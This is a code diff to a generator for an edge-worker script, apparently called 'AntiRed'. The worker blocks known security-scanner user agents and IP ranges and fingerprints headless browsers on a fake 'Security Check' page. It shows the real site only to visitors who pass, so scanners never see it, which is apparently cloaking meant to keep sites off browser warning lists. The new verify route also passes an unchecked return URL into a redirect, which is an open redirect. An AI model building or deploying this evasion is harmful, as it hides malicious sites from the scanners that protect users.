@@ -1133,11 +1133,13 @@ async function deploySharedWorkerRoute(domain, zoneId) {
 
 // ─── Hardened Shared Worker Script ──────────────────────
 // Cookie-gated challenge: origin content NEVER served without valid challenge cookie.
-// Scanners see ONLY the challenge page, never the actual site.
+// Uses redirect-based cookie setting (no fetch() needed — more reliable).
+// Flow: Challenge page → JS checks pass → redirect to /__ar_verify → Set-Cookie → redirect back → origin served
 
 function generateHardenedWorkerScript() {
   const blockedUAs = SCANNER_USER_AGENTS.map(ua => `'${ua}'`).join(',')
   const scannerIPs = SCANNER_IP_RANGES.map(ip => `'${ip}'`).join(',')
+  const secretSeed = require('crypto').randomBytes(16).toString('hex')
 
   return `
 addEventListener('fetch', e => e.respondWith(handleRequest(e.request)));
@@ -1146,7 +1148,7 @@ const BLOCKED_UAS = [${blockedUAs}];
 const SCANNER_IPS = [${scannerIPs}];
 const COOKIE_NAME = '__ar_v';
 const COOKIE_MAX_AGE = 86400;
-const SECRET = 'ar_' + '${Date.now().toString(36)}';
+const SECRET = '${secretSeed}';
 
 function ipInRange(ip, cidr) {
   if (!cidr.includes('/')) return ip === cidr;
@@ -1161,7 +1163,7 @@ async function hmac(message) {
   const enc = new TextEncoder();
   const key = await crypto.subtle.importKey('raw', enc.encode(SECRET), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
   const sig = await crypto.subtle.sign('HMAC', key, enc.encode(message));
-  return [...new Uint8Array(sig)].map(b => b.toString(16).padStart(2, '0')).join('');
+  return [...new Uint8Array(sig)].map(b => b.toString(16).padStart(2, '0')).join('').substring(0, 32);
 }
 
 async function verifyCookie(cookieHeader) {
@@ -1169,9 +1171,10 @@ async function verifyCookie(cookieHeader) {
   const match = cookieHeader.match(new RegExp(COOKIE_NAME + '=([^;]+)'));
   if (!match) return false;
   try {
-    const [ts, sig] = atob(match[1]).split('|');
+    const decoded = decodeURIComponent(match[1]);
+    const [ts, sig] = atob(decoded).split('|');
     const age = Math.floor(Date.now() / 1000) - parseInt(ts);
-    if (age < 0 || age > COOKIE_MAX_AGE) return false;
+    if (isNaN(age) || age < 0 || age > COOKIE_MAX_AGE) return false;
     const expected = await hmac(ts);
     return sig === expected;
   } catch { return false; }
@@ -1183,8 +1186,11 @@ async function makeCookieValue() {
   return btoa(ts + '|' + sig);
 }
 
-const CHALLENGE_PAGE = \`<!DOCTYPE html>
+function challengePage(originalUrl) {
+  const safeUrl = encodeURIComponent(originalUrl);
+  return \`<!DOCTYPE html>
 <html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
 <title>Security Check</title>
 <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:#e0e0e0;display:flex;justify-content:center;align-items:center;min-height:100vh}.c{text-align:center;padding:40px;max-width:420px}.s{width:40px;height:40px;border:3px solid #333;border-top-color:#4f8fff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 24px}@keyframes spin{to{transform:rotate(360deg)}}.t{font-size:18px;margin-bottom:8px;color:#fff}.d{color:#888;font-size:14px}.p{margin-top:20px;height:4px;background:#222;border-radius:2px;overflow:hidden}.pb{height:100%;background:linear-gradient(90deg,#4f8fff,#7c5cff);width:0%;transition:width 0.3s;border-radius:2px}.f{margin-top:16px;color:#555;font-size:12px}</style>
 </head><body><div class="c"><div class="s"></div><div class="t">Verifying your browser</div><div class="d">This is an automatic security check</div><div class="p"><div class="pb" id="pb"></div></div><div class="f" id="st">Please wait...</div></div>
@@ -1204,7 +1210,6 @@ const CHALLENGE_PAGE = \`<!DOCTYPE html>
   var cn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
   if(cn&&cn.rtt===0&&!/localhost/.test(location.hostname))sc+=15;
   if(!window.requestAnimationFrame)sc+=10;
-  if(typeof window.SharedArrayBuffer==='undefined'&&/Chrome\\/[89]/.test(navigator.userAgent))sc+=10;
   try{if(window.outerWidth===0||window.outerHeight===0)sc+=20;}catch(e){}
   setTimeout(function(){up(40,'Verifying identity...');},500);
   setTimeout(function(){up(70,'Almost done...');},1500);
@@ -1216,16 +1221,15 @@ const CHALLENGE_PAGE = \`<!DOCTYPE html>
       document.querySelector('.s').style.animationPlayState='paused';
       return;
     }
-    up(100,'Verified');
-    var d=new Date();d.setTime(d.getTime()+86400000);
-    fetch(location.pathname,{method:'HEAD',headers:{'X-AR-Challenge':'1'}}).then(function(r){
-      var cv=r.headers.get('X-AR-Cookie');
-      if(cv){document.cookie='__ar_v='+cv+';expires='+d.toUTCString()+';path=/;SameSite=Lax;Secure';}
-      location.reload();
-    }).catch(function(){location.reload();});
+    up(100,'Verified ✓');
+    st.style.color='#4ade80';
+    document.querySelector('.s').style.display='none';
+    var verifyUrl='/__ar_verify?r=\${safeUrl}&t='+Math.floor(Date.now()/1000);
+    setTimeout(function(){window.location.href=verifyUrl;},300);
   },2500);
 })();
 </script></body></html>\`;
+}
 
 async function handleRequest(request) {
   const ua = request.headers.get('User-Agent') || '';
@@ -1234,38 +1238,57 @@ async function handleRequest(request) {
 
   // 1. Block known scanner UAs immediately
   if (!ua || BLOCKED_UAS.some(b => ua.includes(b))) {
-    return new Response('<html><body><h1>403</h1></body></html>', {
+    return new Response('<!DOCTYPE html><html><body><h1>403 Forbidden</h1></body></html>', {
       status: 403, headers: { 'Content-Type': 'text/html', 'X-AntiRed': 'blocked-ua' },
     });
   }
 
   // 2. Block known scanner IPs
   if (ip && SCANNER_IPS.some(cidr => ipInRange(ip, cidr))) {
-    return new Response('<html><body><h1>403</h1></body></html>', {
+    return new Response('<!DOCTYPE html><html><body><h1>403 Forbidden</h1></body></html>', {
       status: 403, headers: { 'Content-Type': 'text/html', 'X-AntiRed': 'blocked-ip' },
     });
   }
 
   // 3. Skip challenge for static assets
   const ext = url.pathname.split('.').pop().toLowerCase();
-  const staticExts = ['css','js','png','jpg','jpeg','gif','svg','ico','woff','woff2','ttf','eot','map','json','xml','txt','pdf','zip','mp4','mp3','webp','avif'];
+  const staticExts = ['css','js','png','jpg','jpeg','gif','svg','ico','woff','woff2','ttf','eot','map','xml','txt','pdf','zip','mp4','mp3','webp','avif','webmanifest'];
   if (staticExts.includes(ext)) {
     return fetch(request);
   }
 
-  // 4. Handle challenge verification callback (HEAD request from JS)
-  if (request.method === 'HEAD' && request.headers.get('X-AR-Challenge') === '1') {
-    const cv = await makeCookieValue();
+  // 4. Handle verification redirect — set cookie and redirect to original URL
+  if (url.pathname === '/__ar_verify') {
+    const returnUrl = url.searchParams.get('r') || '/';
+    const timestamp = url.searchParams.get('t');
+
+    // Verify timestamp is recent (within 30 seconds) to prevent replay attacks
+    const now = Math.floor(Date.now() / 1000);
+    const ts = parseInt(timestamp);
+    if (isNaN(ts) || Math.abs(now - ts) > 30) {
+      // Expired or invalid — redirect back to challenge
+      return Response.redirect(url.origin + decodeURIComponent(returnUrl), 302);
+    }
+
+    // Generate signed cookie
+    const cookieValue = await makeCookieValue();
+    const expiry = new Date(Date.now() + COOKIE_MAX_AGE * 1000).toUTCString();
+
     return new Response(null, {
-      status: 204,
-      headers: { 'X-AR-Cookie': cv, 'Cache-Control': 'no-store' },
+      status: 302,
+      headers: {
+        'Location': decodeURIComponent(returnUrl),
+        'Set-Cookie': COOKIE_NAME + '=' + encodeURIComponent(cookieValue) + '; Path=/; HttpOnly; Secure; SameSite=Lax; Expires=' + expiry,
+        'Cache-Control': 'no-store, no-cache',
+        'X-AntiRed': 'cookie-set',
+      },
     });
   }
 
   // 5. Check for valid challenge cookie
   const cookies = request.headers.get('Cookie') || '';
   if (await verifyCookie(cookies)) {
-    // Cookie valid — pass through to origin, add lightweight tracking header
+    // Cookie valid — pass through to origin
     const response = await fetch(request);
     const newHeaders = new Headers(response.headers);
     newHeaders.set('X-AntiRed', 'verified');
@@ -1273,7 +1296,7 @@ async function handleRequest(request) {
   }
 
   // 6. No valid cookie — serve challenge page (NEVER show origin content)
-  return new Response(CHALLENGE_PAGE, {
+  return new Response(challengePage(url.pathname + url.search), {
     status: 200,
     headers: {
       'Content-Type': 'text/html; charset=utf-8',
